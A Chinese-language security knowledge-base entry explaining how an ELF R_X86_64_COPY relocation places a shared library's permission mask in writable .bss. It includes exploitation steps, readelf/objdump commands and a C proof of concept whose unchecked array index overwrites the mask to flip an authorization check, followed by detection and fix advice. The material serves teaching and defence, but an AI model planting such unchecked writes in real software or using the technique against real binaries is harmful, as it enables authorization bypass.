---
id: binary-pwn-elf-copy-relocation-writable-security-state
title: ELF COPY 重定位把共享库安全状态复制进主程序 .bss：越界写可翻转授权判定
type: scenario
domain: binary
path: binary/pwn
technique: elf-copy-relocation-writable-global-state
aliases:
- R_X86_64_COPY
- COPY relocation 提权
- 共享库权限位副本
- .bss 可写副本
- -Bsymbolic 状态分裂
- canonical PLT entry
- RELRO 不保护 .bss
- 共享库导出可变对象
tags:
- elf
- linux
- copy-relocation
- dynamic-linking
- shared-library
- global-buffer-overflow
- relro
- symbol-interposition
- authorization-bypass
- x86-64
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V78
  verified_at: '2026-11-05T16:51:37+08:00'
  notes: 已对照原文与41张图核对：共享库导出 capability_mask=0x01、主程序 extern 直接引用产生 R_X86_64_COPY 到 .bss 0x404028（图08/10）、GNU_RELRO 0x403dd8+0x228 止于 0x404000 而副本在外（图12）、默认绑定库函数经 GOT 读副本故赋值后 lib_value=0x41（图15）、-Bsymbolic 时库内 lea 0x4008 读到 0x01 形成状态分裂（图21）、stash[-8] 越界写使 check(0x40) DENIED→GRANTED（图26）、PIE 仍有 COPY（图35/36）、hidden/protected 阻断 COPY（图37-41）均一致。未验证点：未在本机编译复现；原文版本仅为实验环境（Kali/glibc 2.43-4），非组件受影响区间，未设 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

共享库导出一个可变的安全状态（如 `capability_mask`），主程序又直接 `extern` 引用它时，链接器会生成 `R_X86_64_COPY`，把该变量的初始值复制进主程序可写的 `.bss`；默认绑定下库函数也通过 GOT 解析到这份副本，于是主程序里的一个越界写就能把权限位改成高权限值，让库的授权检查从 DENIED 翻转为 GRANTED——PIE 不免疫 COPY，RELRO 也保护不到 `.bss`。

## 原理

- **COPY 重定位**：主程序直接读写共享库的数据符号时，链接器不把库里的地址填进主程序指令，而是生成 `R_X86_64_COPY`。加载器把共享库中该符号的初始值（如 `0x01`）复制到主程序 `.bss` 中预留的位置（如 `0x404028`），动态符号表里该符号的地址也改为指向主程序副本；之后主程序的取址、读、写全部对准这份副本。
- **默认绑定下的符号抢占**：动态链接器在全局作用域解析符号时，可执行文件的定义优先级最高。库函数内部通过 GOT 访问 `capability_mask`，GOT 槽被解析到主程序副本，而不是库自己的 `0x4008`；库代码一行没改，读到的却是主程序家的地址。
- **`.bss` 天生可写且不在 RELRO 内**：`.bss` 就是放运行时变量的可写段；`GNU_RELRO` 只覆盖 GOT/重定位表附近的一小段，COPY 副本通常落在 RELRO 边界之外，即使开启 Full RELRO 仍可写。
- **安全影响**：如果主程序存在全局数组越界写（如 `stash[idx]`），攻击者可以把副本改成 `0x41`；库的 `check_capability(0x40)` 读到 `0x41` 返回 GRANTED。攻击者不需要碰共享库映射、不需要对抗 RELRO、不需要任何特殊权限，只是用主程序自己的写原语改写了“权限状态”。
- **`-Bsymbolic` 不是修复**：它让库内引用变为不可抢占，链接器把 GOTPCRELX relax 成 `lea` 直接取库内地址；主程序仍读写副本，库函数读自己的 `0x01`——同一进程出现两份状态，授权判定一边 GRANTED、一边 DENIED，依赖“两端一致”的审计逻辑会错乱。COPY 记录也不会消失。
- **PIE 不免疫**：PIE 只随机化加载基址，`direct_pie_consumer` 仍有 COPY，只是 Offset/符号值写成链接时偏移，运行时加载器再加基址。
- **canonical PLT entry**：函数符号被主程序取地址时，链接器把其权威地址固定到主程序 `.plt` 的专用入口（`R_X86_64_JUMP_SLOT` 填的是主程序 `.plt` 地址）；所有函数指针都指向该入口，影响函数指针相等性比较与多 DSO 的解析次序，是同根因的姊妹机制。
- **修复方向**：调用方只用函数接口访问状态；提供方用 `-fvisibility=hidden` + 显式 `visibility("default")` 只导出 API 函数，或用 `protected` 数据符号（GNU ld 会拒绝为其生成 COPY："non-copyable protected symbol"），或用 version script 精确控制导出名单。

## 触发条件

- 目标为 x86-64 Linux（AArch64/RISC-V 等工具链通常不生成 COPY）。
- 共享库导出了 `OBJECT GLOBAL DEFAULT` 的可变对象，且该对象承载权限位、开关、长度、策略标志等安全决策状态。
- 主程序直接 `extern` 引用该对象（而不是调用 getter/setter），链接时产生 `R_X86_64_COPY`。
- 主程序存在可命中该副本的写原语（全局数组越界写、任意写、格式化字符串写等）。
- 默认符号绑定（非 `-Bsymbolic`）使库函数读取主程序副本；即使 `-Bsymbolic`，状态分裂也可能导致授权不一致。

## 利用步骤

1. 查共享库导出的可变对象：
   ```bash
   readelf -sW libcapability.so | grep 'OBJECT  GLOBAL DEFAULT.*capability_mask'
   ```
2. 查可执行文件的 COPY 重定位：
   ```bash
   readelf -rW direct_consumer | grep R_X86_64_COPY
   ```
3. 确认副本位置与保护范围：
   ```bash
   readelf -sW direct_consumer | grep capability_mask   # 地址指向 .bss
   readelf -SW direct_consumer | grep -E '\.(bss|dynbss)' # 应为 WA
   readelf -lW direct_consumer | grep GNU_RELRO          # 副本在 RELRO 之外
   ```
4. 反汇编确认主程序直接读写副本、库函数经 GOT 读取：
   ```bash
   objdump -d -M intel direct_consumer | sed -n '/<main>:/,/ret/p'
   objdump -d -M intel libcapability.so | sed -n '/<provider_mask_value>:/,+7p'
   ```
5. 构造/利用主程序写原语命中副本：在示例中 `stash[-8]` 正好落到 `capability_mask`。
6. 调用库的授权检查，观察结果翻转。

## PoC

```c
/* vuln_consumer.c：主程序直接引用共享库权限位，并用越界写命中 COPY 副本 */
#include <stdio.h>
#include <stdlib.h>

extern int capability_mask;
int check_capability(int required);
int stash[16];

int main(int argc, char **argv) {
    int idx = 0;
    printf("before: check(0x40)=%s mask=%p stash=%p delta=%ld\n",
           check_capability(0x40) ? "GRANTED" : "DENIED",
           (void *)&capability_mask, (void *)stash,
           (long)&capability_mask - (long)stash);
    if (argc > 1)
        idx = atoi(argv[1]);      /* 攻击者控制下标，无边界检查 */
    stash[idx] = 0x41;            /* idx=-8 命中 capability_mask 副本 */
    printf("after:  check(0x40)=%s\n",
           check_capability(0x40) ? "GRANTED" : "DENIED");
    return 0;
}
```

```bash
gcc -no-pie -O0 -g -Wall -Wextra -Werror vuln_consumer.c -L. -lauth -Wl,-rpath,'$ORIGIN' -o vuln_consumer
readelf -rW vuln_consumer | grep capability_mask
# 000000404040  0000000000000008 R_X86_64_COPY  capability_mask + 0
./vuln_consumer -8
# before: check(0x40)=DENIED mask=0x404040 stash=0x404060 delta=-32
# after:  check(0x40)=GRANTED
```

## 变体与关联

- 变体：`-Bsymbolic` 库让库内 `provider_mask_value` 变成 `lea` 直拨，主程序副本与库内状态分裂；授权路径不同则结论不同。
- 变体：PIE 程序仍有 COPY，只是副本地址加基址；攻击者需先泄露基址，但写原语仍可命中。
- 变体：函数符号取址触发 canonical PLT entry，函数指针比较（`fn == expected`）语义被改写；多 DSO 场景下解析次序可能被利用。
- 变体：把 COPY 副本换成 `LD_PRELOAD`/符号抢占攻击，影响库内对全局状态的读取。
- 关联：[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（格式化字符串写原语）、[[code-analysis-reverse-linux-elf]]（ELF 结构分析）、[[binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp]]（动态链接器/ifunc 时机）。
- 边界：共享库不导出可变对象、调用方只用函数接口、数据符号用 `hidden`/`protected` 隐藏、主程序没有可命中副本的写原语时，该链不成立。

## 检测与防御

- 检测/审计：
  1. `readelf -sW lib.so | grep 'OBJECT  GLOBAL DEFAULT'` 找默认可见的可变对象；
  2. 对每个可执行文件 `readelf -rW prog | grep R_X86_64_COPY` 找 COPY；
  3. 判断被 COPY 的对象是否承载权限位、开关、长度、策略标志等安全状态；
  4. `objdump -d` 确认库函数是“查 GOT”还是“直接 lea”，判断是否跟随主程序副本。
- 修复（调用方）：改用共享库提供的函数接口读写状态，不直接 `extern` 数据符号，COPY 就不会生成。
- 修复（提供方）：`-fvisibility=hidden` 默认隐藏，只对 API 函数显式 `visibility("default")`；数据符号用 `protected`（链接器拒绝 COPY）；或用 version script 精确控制导出名单。
- 加固：避免全局数组越界写；对安全决策状态使用不可写/只读存储或函数封装；注意 PIE 与 RELRO 均不能消除 COPY 副本的风险。
